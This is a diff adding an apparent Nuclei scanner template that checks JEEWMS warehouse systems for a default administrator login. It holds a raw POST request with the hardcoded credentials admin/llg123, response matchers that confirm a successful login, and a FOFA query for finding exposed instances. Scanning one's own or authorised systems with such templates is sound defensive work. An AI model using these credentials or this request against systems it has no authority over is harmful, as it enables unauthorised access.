@@ -1,0 +1,40 @@
+id: jeewms-default-login
+info:
+  name: JEEWMS default-login
+  author: leadlife
+  severity: high
+  description: 
+  reference: 
+    - demo
+  classification:
+    cve-id: 
+  metadata:
+    verified: true
+    fofa-query: body="plug-in/lhgDialog/lhgdialog.min.js?skin=metro"
+  tags: jeewms,default-login
+
+http:
+  - raw:
+      - |
+        POST /loginController.do?checkuser HTTP/1.1
+        Host: {{Hostname}}
+        Content-Length: 62
+        X-Requested-With: XMLHttpRequest
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36
+        Accept: */*
+        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+        Origin: {{RootURL}}
+        Referer: {{RootURL}}
+        Accept-Encoding: gzip, deflate, br
+        Accept-Language: zh,ja;q=0.9
+        Connection: keep-alive
+
+        ReturnURL=&userName=admin&password=llg123&langCode=zh-cn&orgId=
+        
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - contains_all(body,'success','attributes')
+          - contains_all(header,'Set-Cookie')
+        condition: and
